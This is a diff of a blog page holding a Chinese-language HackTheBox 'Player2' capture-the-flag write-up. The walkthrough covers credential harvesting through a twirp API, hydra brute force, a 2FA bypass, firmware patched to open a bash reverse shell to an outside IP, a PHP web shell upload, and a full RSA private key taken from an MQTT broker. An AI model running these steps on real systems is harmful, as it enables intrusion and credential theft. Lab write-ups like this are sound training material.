@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;221  10.10.10.170  端口扫描这里需要全端口扫描，默认扫描会漏掉开放的8545:   80直接访问是一个错误页面：  配置hosts访问： 110.10.10.170 player2.htb   subdomain1wfuzz -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;s">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;221  10.10.10.170  端口扫描这里需要全端口扫描，默认扫描会漏掉开放的8545:">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Player2 - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/06/30/Player2-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;221  10.10.10.170  端口扫描这里需要全端口扫描，默认扫描会漏掉开放的8545:   80直接访问是一个错误页面：  配置hosts访问： 110.10.10.170 player2.htb   subdomain1wfuzz -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;s">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;221  10.10.10.170  端口扫描这里需要全端口扫描，默认扫描会漏掉开放的8545:">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062903.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062904.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062901.jpg">
@@ -145,7 +145,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -236,32 +236,97 @@
 <li><h2 id="10-10-10-170"><a href="#10-10-10-170" class="headerlink" title="10.10.10.170"></a>10.10.10.170</h2></li>
 </ul>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>这里需要全端口扫描，默认扫描会漏掉开放的8545:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062903.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062904.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062903.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062904.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>直接访问是一个错误页面：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062901.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062901.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>配置hosts访问：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.170 player2.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062902.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062902.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="subdomain"><a href="#subdomain" class="headerlink" title="subdomain"></a>subdomain</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 -H "Host: FUZZ.player2.htb" --hh 102 -u http://10.10.10.170</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062905.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062905.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p> 同样把product.player2.htb加到hosts里，访问：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062906.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062906.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="8545"><a href="#8545" class="headerlink" title="8545"></a>8545</h2><p>直接访问：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062909.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062909.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>根据信息，知道是twirp，根据文档</p>
 <p><a href="https://github.com/twitchtv/twirp/blob/master/docs/routing.md" target="_blank" rel="noopener">https://github.com/twitchtv/twirp/blob/master/docs/routing.md</a></p>
 <p>知道service定义是在.proto文件，稍后的目录扫描中有proto目录</p>
 <h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://player2.htb/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -x php</span><br><span class="line"></span><br><span class="line">/images (Status: 301)</span><br><span class="line">/index (Status: 200)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/assets (Status: 301)</span><br><span class="line">/src (Status: 301)</span><br><span class="line">/mail (Status: 200)</span><br><span class="line">/mail.php (Status: 200)</span><br><span class="line">/vendor (Status: 301)</span><br><span class="line">/generated (Status: 301)</span><br><span class="line">/proto (Status: 301)</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://product.player2.htb/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -x php</span><br><span class="line"></span><br><span class="line">/images (Status: 301)</span><br><span class="line">/home (Status: 302)</span><br><span class="line">/home.php (Status: 302)</span><br><span class="line">/totp (Status: 302)</span><br><span class="line">/totp.php (Status: 302)</span><br><span class="line">/index (Status: 200)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/assets (Status: 301)</span><br><span class="line">/mail (Status: 200)</span><br><span class="line">/mail.php (Status: 200)</span><br><span class="line">/api (Status: 301)</span><br></pre></td></tr></table></figure>
 
 <h2 id="api"><a href="#api" class="headerlink" title="api"></a>api</h2><p>直接访问是403:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062907.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062907.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>继续扫描：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://product.player2.htb/api/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -x php</span><br><span class="line"></span><br><span class="line">/totp (Status: 200)</span><br><span class="line">/totp.php (Status: 200)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062908.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062908.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://product.player2.htb/api/totp</span><br><span class="line"></span><br><span class="line">&#123;"error":"Invalid Session"&#125;</span><br></pre></td></tr></table></figure>
 
 <p>根据信息搜索发现</p>
@@ -269,7 +334,14 @@
 <p>这里是Time-based One-time Password，用于根据时间生成一次性密码</p>
 <h2 id="proto"><a href="#proto" class="headerlink" title="proto"></a>proto</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;player2.htb&#x2F;api&#x2F;proto -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt -t 50 -x proto</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062910.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062910.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>这个proto定义了一个Auth service，package是twirp.player2.auth ，这个service有一个GenCreds() 方法用于返回Creds</p>
 <h1 id="twirp"><a href="#twirp" class="headerlink" title="twirp"></a>twirp</h1><p>基于protobuf的RPC框架，根据官方文档：</p>
 <p><a href="https://twitchtv.github.io/twirp/docs/curl.html" target="_blank" rel="noopener">https://twitchtv.github.io/twirp/docs/curl.html</a></p>
@@ -287,29 +359,85 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hydra -C userpass.txt product.player2.htb http-post-form "/index:username=^USER^&amp;password=^PASS^&amp;Submit=Sign in:Nope"</span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: product.player2.htb   login: mprox   password: tR@dQnwnZEk95*6#</span><br><span class="line">[80][http-post-form] host: product.player2.htb   login: 0xdf   password: XHq7_WJTA?QD_?E2</span><br></pre></td></tr></table></figure>
 
 <p>得到两组账号密码，可用，但还需要OTP：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062911.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062911.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="client-sh"><a href="#client-sh" class="headerlink" title="client.sh"></a>client.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Finding Credentials..."</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 100`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">curl -s -X POST -H <span class="string">"Content-Type: application/protobuf"</span> \</span><br><span class="line">http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds \</span><br><span class="line">| ./bin/protoc -I . --decode twirp.player2.auth.Creds generated.proto \</span><br><span class="line">| tr <span class="string">'\n'</span> <span class="string">' '</span> &gt;&gt; userpass.txt</span><br><span class="line"><span class="built_in">echo</span> &gt;&gt; userpass.txt</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Unique Credentials:"</span></span><br><span class="line">gawk -i inplace <span class="string">'!a[$0]++'</span> userpass.txt</span><br><span class="line">cat userpass.txt</span><br></pre></td></tr></table></figure>
 
 <h1 id="totp"><a href="#totp" class="headerlink" title="totp"></a>totp</h1><p>直接POST访问：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062912.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062912.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>加上action：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062913.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062913.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>这里尝试一些常见OTP参数，得到正确的backup_codes：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062914.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062914.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p> 使用这个OTP代码可以成功登录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062915.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062915.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="2FA-bypass"><a href="#2FA-bypass" class="headerlink" title="2FA bypass"></a>2FA bypass</h2><p>应该是后端代码实现问题，action直接使用true即可通过校验：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062916.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062916.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>后端代码应该是类似这种,PHP弱类型：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($action == <span class="string">"backup_codes"</span>) &#123;</span><br><span class="line"><span class="comment">// Send backup code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h1 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h1><p>access那里给了一份文档是关于Protobs Firmware的，里面有固件下载链接和测试地址：</p>
 <p><a href="http://product.player2.htb/protobs/protobs_firmware_v1.0.tar" target="_blank" rel="noopener">http://product.player2.htb/protobs/protobs_firmware_v1.0.tar</a></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062917.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062917.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget http://product.player2.htb/protobs/protobs_firmware_v1.0.tar</span><br><span class="line">tar xvf protobs_firmware_v1.0.tar</span><br><span class="line">x info.txt</span><br><span class="line">x Protobs.bin</span><br><span class="line">x version</span><br><span class="line"></span><br><span class="line">file Protobs.bin</span><br><span class="line">Protobs.bin: data</span><br></pre></td></tr></table></figure>
 
 <p>直接上传这个固件是all check pass：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062918.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062918.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><p>直接binwalk分析bin文件，里面是一个64位elf：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> binwalk Protobs.bin</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">64            0x40            ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)</span><br></pre></td></tr></table></figure>
 
@@ -318,39 +446,106 @@
 
 <h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>直接把提取出来的elf扔到ghidra里</p>
 <h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p>main函数调用wait_for_fkey之后继续执行：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063001.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063001.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="wait-for-fkey"><a href="#wait-for-fkey" class="headerlink" title="wait_for_fkey"></a>wait_for_fkey</h2><p>这个函数使用system调用stty命令更改终端设置，我们前面已经知道上传的固件验证通过后会执行，那么我们可以考虑修改固件使其执行恶意命令：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063002.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063002.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h2><p>因为固件会校验签名，根据文档签名算法：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063003.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063003.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>根据上面的签名过程，我们看到签名是使用program code和哈希函数计算的。 服务器可能会忽略program code的某些初始字节，这将使我们绕过验证。我们可以尝试直接修改固件bin文件后重新打包</p>
 <h2 id="固件修改"><a href="#固件修改" class="headerlink" title="固件修改"></a>固件修改</h2><p>修改固件中system执行的字符串，之后重新打包，上传，getshell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.46/7777 0&gt;&amp;1";</span><br><span class="line"></span><br><span class="line">tar cvf shell2.tar Protobs.bin info.txt version</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063004.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063005.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063004.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063005.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>另一种方式，固件上传测试那里打包上传shell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar cvf shell.tar Protobs.bin info.txt version shell</span><br><span class="line">a Protobs.bin</span><br><span class="line">a info.txt</span><br><span class="line">a version</span><br><span class="line">a shell</span><br><span class="line">a shell/shell.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062919.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020062919.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="MQTT"><a href="#MQTT" class="headerlink" title="MQTT"></a>MQTT</h1><p>上述两种方式都能得到www-data用户shell，继续查看信息：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps auxww</span><br><span class="line">...</span><br><span class="line">mosquit+   1137  0.0  0.2  48024  5792 ?        S    04:40   0:02 /usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf</span><br><span class="line">...</span><br><span class="line">netstat -antp | grep LIST</span><br><span class="line">...</span><br><span class="line">tcp        0      0 127.0.0.1:1883          0.0.0.0:*               LISTEN</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <p>Mosquitto是一个开源的MQTT代理，用于在使用设备或传感器时传递消息，它使用基于发布-订阅模型的mqtt协议。 每个客户端都可以订阅主题，以及发布与这些主题有关的信息。</p>
 <p>netstat查看1883端口开着，这是mosquito server的默认端口。</p>
 <h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>我们可以通过www-data的shell加载个meterpreter，方便操作，将1883端口进行转发：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063006.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063006.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>之后直接访问我们本地1883端口就相当于访问远程机器localhost的1883:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mosquitto_sub -t '$SYS/#' -h 127.0.0.1 -p 1883</span><br><span class="line">...</span><br><span class="line">Retrieving the key from aws instance</span><br><span class="line">Key retrieved..</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEA7Gc/OjpFFvefFrbuO64wF8sNMy+/7miymSZsEI+y4pQyEUBA</span><br><span class="line">R0JyfLk8f0SoriYk0clR/JmY+4mK0s7+FtPcmsvYgReiqmgESc/brt3hDGBuVUr4</span><br><span class="line">et8twwy77KkjypPy4yB0ecQhXgtJNEcEFUj9DrOq70b3HKlfu4WzGwMpOsAAdeFT</span><br><span class="line">+kXUsGy+Cp9rp3gS3qZ2UGUMsqcxCcKhn92azjFoZFMCP8g4bBXUgGp4CmFOtdvz</span><br><span class="line">SM29st5P4Wqn0bHxupZ0ht8g30TJd7FNYRcQ7/wGzjvJzVBywCxirkhPnv8sQmdE</span><br><span class="line">+UAakPZsfw16u5dDbz9JElNbBTvwO9chpYIs0QIDAQABAoIBAA5uqzSB1C/3xBWd</span><br><span class="line">62NnWfZJ5i9mzd/fMnAZIWXNcA1XIMte0c3H57dnk6LtbSLcn0jTcpbqRaWtmvUN</span><br><span class="line">wANiwcgNg9U1vS+MFB7xeqbtUszvoizA2/ScZW3P/DURimbWq3BkTdgVOjhElh6D</span><br><span class="line">62LlRtW78EaVXYa5bGfFXM7cXYsBibg1+HOLon3Lrq42j1qTJHH/oDbZzAHTo6IO</span><br><span class="line">91TvZVnms2fGYTdATIestpIRkfKr7lPkIAPsU7AeI5iAi1442Xv1NvGG5WPhNTFC</span><br><span class="line">gw4R0V+96fOtYrqDaLiBeJTMRYp/eqYHXg4wyF9ZEfRhFFOrbLUHtUIvkFI0Ya/Y</span><br><span class="line">QACn17UCgYEA/eI6xY4GwKxV1CvghL+aYBmqpD84FPXLzyEoofxctQwcLyqc5k5f</span><br><span class="line">llga+8yZZyeWB/rWmOLSmT/41Z0j6an0bLPe0l9okX4j8WOSmO6TisD4WiFjdAos</span><br><span class="line">JqiQej4Jch4fTJGegctyaOwsIVvP+hKRvYIwO9CKsaAgOQySlxQBOwMCgYEA7l+3</span><br><span class="line">JloRxnCYYv+eO94sNJWAxAYrcPKP6nhFc2ReZEyrPxTezbbUlpAHf+gVJNVdetMt</span><br><span class="line">ioLhQPUNCb3mpaoP0mUtTmpmkcLbi3W25xXfgTiX8e6ZWUmw+6t2uknttjti97dP</span><br><span class="line">QFwjZX6QPZu4ToNJczathY2+hREdxR5hR6WrJpsCgYEApmNIz0ZoiIepbHchGv8T</span><br><span class="line">pp3Lpv9DuwDoBKSfo6HoBEOeiQ7ta0a8AKVXceTCOMfJ3Qr475PgH828QAtPiQj4</span><br><span class="line">hvFPPCKJPqkj10TBw/a/vXUAjtlI+7ja/K8GmQblW+P/8UeSUVBLeBYoSeiJIkRf</span><br><span class="line">PYsAH4NqEkV2OM1TmS3kLI8CgYBne7AD+0gKMOlG2Re1f88LCPg8oT0MrJDjxlDI</span><br><span class="line">NoNv4YTaPtI21i9WKbLHyVYchnAtmS4FGqp1S6zcVM+jjb+OpBPWHgTnNIOg+Hpt</span><br><span class="line">uaYs8AeupNl31LD7oMVLPDrxSLi/N5o1I4rOTfKKfGa31vD1DoCoIQ/brsGQyI6M</span><br><span class="line">zxQNDwKBgQCBOLY8aLyv/Hi0l1Ve8Fur5bLQ4BwimY3TsJTFFwU4IDFQY78AczkK</span><br><span class="line">/1i6dn3iKSmL75aVKgQ5pJHkPYiTWTRq2a/y8g/leCrvPDM19KB5Zr0Z1tCw5XCz</span><br><span class="line">iZHQGq04r9PMTAFTmaQfMzDy1Hfo8kZ/2y5+2+lC7wIlFMyYze8n8g==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <p>我们得到了一个ssh私钥</p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>查看home目录可以得到用户名observer，直接使用刚得到私钥登录就可以：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063007.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020063007.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权-二进制打法"><a href="#提权-二进制打法" class="headerlink" title="提权 二进制打法"></a>提权 二进制打法</h1><p>二进制方法是用UAF，heap太烦了，直接参考官方wp吧</p>
